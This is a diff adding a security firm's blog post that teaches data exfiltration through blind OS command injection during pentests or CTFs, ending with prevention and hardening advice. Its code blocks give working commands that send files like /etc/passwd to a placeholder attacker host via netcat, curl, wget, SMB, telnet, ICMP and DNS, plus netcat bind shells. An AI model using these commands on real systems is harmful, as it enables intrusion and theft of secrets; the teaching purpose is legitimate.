@@ -1,0 +1,342 @@
+---
+layout: blogpost
+title: "Data Exfiltration via Blind OS Command Injection"
+author: "Craig Donkin"
+author_role: "Senior Consultant"
+summary: "On a penetration test or CTF challenge you may come across an application that takes user input and passes it to a system command or to a supporting program that runs a task on the underlying server."
+tags: [Vulnerabilities and exploits]
+hero_banner: CodeBanner.jpg
+---
+{% raw %}
+<article class="article-content">
+<p>If validation is not performed against user input, the application may be vulnerable to an attack known as <a href="https://www.owasp.org/index.php/Command_Injection">‘Operating System Command Injection’</a>. It may be possible for an attacker to supply input to the application that contains operating system commands that are executed with the privileges of the vulnerable application. Context has observed this type of attack in a large number of applications, for example:</p>
+<ul>
+<li>Applications that send an email to a user supplied address,</li>
+<li>Enterprise Server Monitoring applications that return system health information,</li>
+<li>Applications that use 3rd party tools to generate on-the-fly reports based on user supplied input.</li>
+</ul>
+<p>After identifying a vulnerability on a pentest or CTF you may start to target areas of interest on the host in the hope of finding the trophy or sensitive information such as:</p>
+<ul>
+<li>Operating System Password Files,</li>
+<li>Operating System configuration files,</li>
+<li>Database files,</li>
+<li>Application Source Code.</li>
+</ul>
+<p>The following screenshot shows a basic example: I have injected the Windows command ‘type’, which was passed as a parameter and interpreted as a system command reading a file containing top secret missile launch codes that were stored on the server:</p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/intro_Xb5qUru.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/intro_Xb5qUru.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/intro_Xb5qUru.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/intro_Xb5qUru.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>Often it is necessary to ‘break out’ of the command that is already running to execute arbitrary commands. Imagine a system health application that takes a host IP address and runs ‘ping’ against an IP address to determine if the host is up. On the underlying OS the following command is run where the IP address is the user supplied input.</p>
+<pre class="prettyprint">ping –c 5 xxx.xxx.xxx.xxx</pre>
+<p>If you want to run your own command after the application has run the intended ping command, it may be possible to inject command operators which allow you to run arbitrary OS commands on the host. The following table details a number of these that can be used in this attack:</p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/table2.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/table2.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/table2.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/table2.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>In the missile code example we saw that the contents of the file were returned by the application within the HTTP response data. Often no output is returned after the command has run. These vulnerabilities are known as ‘Blind OS Command Injection’.</p>
+<p>How do we retrieve sensitive information or our trophy from the host in this instance? This blog will detail a number of ways this can be achieved without uploading a web shell to the host. </p>
+<h2 class="section-title">NetCat</h2>
+<p>The first example is using netcat. <a href="https://en.wikipedia.org/wiki/Netcat">Netcat</a> is a simple utility which reads and writes data across a network connection using TCP or UDP. If netcat is running on the vulnerable server, you could use it to set up a listener and then redirect the output of operating system commands into the listener.</p>
+<p>After you have broken out of the command, set up a netcat listener on the vulnerable server and pipe the contents of the file into the listener:</p>
+<pre class="prettyprint">nc –l –p {port} &lt; {file/to/extract}</pre>
+<p>On your host you can connect to the listener on the vulnerable server and retrieve the output. The following screenshot shows how we have retrieved the /etc/passwd file from the host:</p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/nc-1_PmaJ6cs.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/nc-1_PmaJ6cs.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/nc-1_PmaJ6cs.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/nc-1_PmaJ6cs.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>If the host is running windows and netcat is present a similar attack can be done with the following command:</p>
+<pre class="prettyprint">type {file to extract}  | nc -L -p {port}</pre>
+<h2 class="section-title">cURL</h2>
+<p><a href="https://en.wikipedia.org/wiki/CURL">cURL</a> is a library and command-line tool for transferring data using various protocols, and is a very useful tool for data exfiltration.  If the vulnerable server has cURL we can use it to POST a file to a malicious web server or to transfer a file using a number of protocols, such as FTP/SCP/TFTP/TELNET and more.</p>
+<p>To use HTTP once you have identified an OS command injection vulnerability, use the following command to POST the contents of a file to your web server:</p>
+<pre class="prettyprint">cat /path/to/file | curl –F “:data=@-“ http://xxx.xxx.xxx.xxxx:xxxx/test.txt</pre>
+<p>You will be able to see the contents of the file in the server logs. If this was done on a penetration test, the web server could be configured to use SSL to protect client data being transmitted over the internet. The following screenshot shows the contents of the /etc/passwd file within the data field of a request:</p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/curl-1.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/curl-1.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/curl-1.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/curl-1.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>The CURL command can also be used to transfer a file over FTP. Once you have identified an OS command injection vulnerability, use the –T flag to transfer a file to an FTP server:</p>
+<pre class="prettyprint">curl –T {path to file} ftp://xxx.xxx.xxx.xxx –user :{password}</pre>
+<p>In the following screenshot I have used FTP to steal top secret plans for world domination from the vulnerable server:</p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/curl-2.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/curl-2.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/curl-2.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/curl-2.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>As mentioned earlier cURL can be used to transfer data over other protocols not discussed here, such as SCP, TFTP and TELNET.</p>
+<h2 class="section-title">WGET</h2>
+<p><a href="https://en.wikipedia.org/wiki/Wget">Wget</a> is a tool more commonly used for non-interactive download of files from the web; however there are a few flags that can be used to retrieve a file or data from a web server by using custom headers and POST requests.</p>
+<p>It is possible to use WGET to submit a request to the server with a header line in the format of:</p>
+<pre class="prettyprint">–header=’name:value’</pre>
+<p>It is possible to submit a request to the server with a custom header that contains the contents of a file you want to capture. To do so we need to retrieve the contents of a file and set this as the header value. </p>
+<p>As we learned earlier, we can use a subshell to run commands within another command. In the following example I have entered the command I want to run in a subshell as the value for the header:</p>
+<pre class="prettyprint">wget –header=”EVIL:$(cat /data/secret/password.txt)”http://xxx.xxx.xxx:xxx</pre>
+<p>As you can see in the screenshot, our webserver logs shows a request has been made and the contents of /data/secret/password.txt have been returned as the value for the header ‘EVIL’:</p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/wget-1.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/wget-1.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/wget-1.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/wget-1.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>We can also use ticks to encapsulate a separate command within data that is being processed by the original command. The next example shows how we have retrieved the /etc/passwd file. As the file is more than one line I have used xargs and echo to strip the new lines:</p>
+<pre class="prettyprint">wget –header=”evil:`cat /etc/passwd | xargs echo –n`” http://xxx.xxx.xxx:xxxx</pre>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/wget-2.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/wget-2.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/wget-2.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/wget-2.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>It is also possible to use WGET to submit a POST request to our web server  and send string data in the request body using the ‘—post-data’ flag or the contents of a file using the ‘—post-file’ flag. These flags expect the content of the form</p>
+<pre class="prettyprint">‘key1=value1&amp;key2=value2’.</pre>
+<p>To retrieve the contents of a file using ‘post-data’ we can run a command such as the one below which extracts a file containing a secret code:</p>
+<pre class="prettyprint">wget –post-data exfil=`cat /data/secret/secretcode.txt` http://xxx.xxx.xxx.xxx:xxxx</pre>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/wget-3.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/wget-3.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/wget-3.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/wget-3.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>The next command shows how we can use ‘post-file’ to retrieve a web page that forms part of the application. On a pentest we might do this to view the code to identify further vulnerabilities; on a CTF you might do this to reveal a trophy hidden within the PHP code:</p>
+<pre class="prettyprint">wget –post-file trophy.php http://xxx.xxx.xxx.xxx:xxxx</pre>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/wget-4.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/wget-4.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/wget-4.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/wget-4.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<h2 class="section-title">SMB</h2>
+<p>If the vulnerable web application is running on windows it may be possible to extract a file by creating a network share on your host and then getting the victim server to connect to your share and to copy the file over. This can be done with the <a href="https://technet.microsoft.com/en-us/library/bb490717.aspx">net use</a> command:</p>
+<pre class="prettyprint">net use h: \\xxx.xxx.xxx.xxx\web /user: {password} &amp;&amp; copy {File to Copy} h:\{filename}.txt</pre>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/smb.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/smb.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/smb.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/smb.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<h2 class="section-title">TELNET</h2>
+<p>If <a href="https://en.wikipedia.org/wiki/Telnet">telnet</a> client is on the remote server you can use this to transfer a file to a listener on your host using the following command:</p>
+<pre class="prettyprint">telnet xxx.xxx.xxx.xxx {port} &lt; {file to transfer}</pre>
+<p>The following screenshot shows the /etc/passwd file being retrieved:</p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/telnet1.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/telnet1.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/telnet1.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/telnet1.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<h2 class="section-title">ICMP</h2>
+<p>If the host you are targeting has been hardened and tools such as netcat, wget and CURL have been removed there are still some techniques you can use.  Try and get the host to ping your box and see if ICMP is let out through any intervening firewalls.  If it is, and the underlying host is running Linux, we can exfiltrate data in ICMP echo requests using the –p flag.  The –p flag allows you to specify up to 16 “pad” bytes. This is where we will store the data we want to exfiltrate.</p>
+<p>First we need to convert the file into hex, and then specify the data to be inserted into the packet. This can be done with the following one-liner:</p>
+<pre class="prettyprint">cat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done</pre>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/icmp-1.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/icmp-1.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/icmp-1.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/icmp-1.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>In Wireshark we can observe the packets containing our data.  You could write a script which scrapes the packets and re-assembles the file on the host.</p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/icmp-2.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/icmp-2.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/icmp-2.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/icmp-2.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/icmp-3.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/icmp-3.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/icmp-3.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/icmp-3.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/icmp4.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/icmp4.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/icmp4.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/icmp4.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<h2 class="section-title">DNS</h2>
+<p>In a similar way to using ping, DNS can also be used to exfiltrate data. This time we are going to use each line of data as the host name of a DNS query. By monitoring the traffic on our machine we can reassemble the file. In this instance the following command is submitted as part of our request to the vulnerable server:</p>
+<pre class="prettyprint">cat /data/secret/password.txt | while read exfil; do host $exfil.contextis.com 192.168.107.135; done</pre>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/dns-1.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/dns-1.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/dns-1.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/dns-1.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p>As with ping you could write a script to scrape the incoming DNS packets and reassemble the file:</p>
+<figure class="img-width-2-3">
+<div class="modal-img-container">
+<picture>
+<!--[if IE 9]><video style="display: none;"><![endif]-->
+<source height="auto" srcset="/blog/assets/media/_image_800_auto/dns2.width-800.png" style="min-width:768px"/>
+<!--[if IE 9]></video><![endif]-->
+<img alt="" srcset="/blog/assets/media/_image_800_auto/dns2.width-800.png"/>
+</picture>
+<div class="modal-hover">
+<a class="modal-img hidden-xs" href="/blog/assets/media/_image_1900_auto/dns2.width-800.png"></a>
+<a class="modal-img visible-xs" href="/blog/assets/media/_image_800_auto/dns2.width-800.png"></a>
+</div>
+</div><!-- /modal-img-container -->
+</figure>
+<p><a href="http://www.contextis.com/resources/blog/dnswatch-when-full-dns-tunnel-just-too-much/">DNSWatch</a> can also be used to retrieve data. For more information check out the blog post.</p>
+<h2 class="section-title">Taking it further</h2>
+<p>A number of techniques detailed within this blog could be used to further an attack on a victim application. For example you could get an interactive shell using netcat: </p>
+<pre class="prettyprint">nc -L -p 9090 -e cmd.exe (Windows)
+nc -l -p 9090 -e /bin/bash (*nix)</pre>
+<p>Or you could host scripts and tools that you then retrieve using cURL, WGET, SMB etc to further attack the host. Hopefully this blog gives you some ideas for your next penetration test or CTF.</p>
+<h2 class="section-title">Prevention</h2>
+<p>In this blog post we’ve demonstrated a number of techniques for exfiltrating data from a server using blind OS command injection. So how do you go about preventing such an occurrence?</p>
+<ol>
+<li>Prevent, if possible, user supplied input from being passed to or used as arguments for OS Commands.</li>
+<li>All user input should be sanitised, with any damaging characters such as those shown in the table at the start of the blog being stripped out. The best way to do this is to use a whitelist of allowed characters. Anything not in the list should be logged and discarded.</li>
+<li>Perform regular code reviews and penetration tests to ensure vulnerabilities within your application are identified and remediate vulnerabilities quickly and effectively.  A follow up test should be conducted to make sure any identified vulnerabilities have been remediated successfully.</li>
+</ol>
+<p>The web application server should also be hardened, to ensure that if the application is vulnerable then the impact of the compromise is mitigated:</p>
+<ol>
+<li>Remove any unnecessary tools from the server such as cURL, Wget and NetCat which could be used by an attacker.</li>
+<li>Run the web service daemon with a low privileged account.</li>
+<li>Ensure regular reviews of web application logs are conducted to identify any attacks against your network.</li>
+<li>Use firewalls to prevent an attacker from calling back to their server.</li>
+<li>Perform a host-based audit of application servers to ensure security weaknesses are identified and remediated.</li>
+</ol>
+<p>I hope you have found this blog interesting and useful. The techniques detailed in this blog are by no means novel or conclusive but form a good start to exploiting blind OS command injection. </p>
+<h2 class="section-title">Contact and Follow-Up</h2>
+<p>Craig is part of our Assurance team in Context's London office. See the <a href="https://www.contextis.com/en/contact">Contact</a> page for how to get in touch.</p>
+</article>
+{% endraw %}
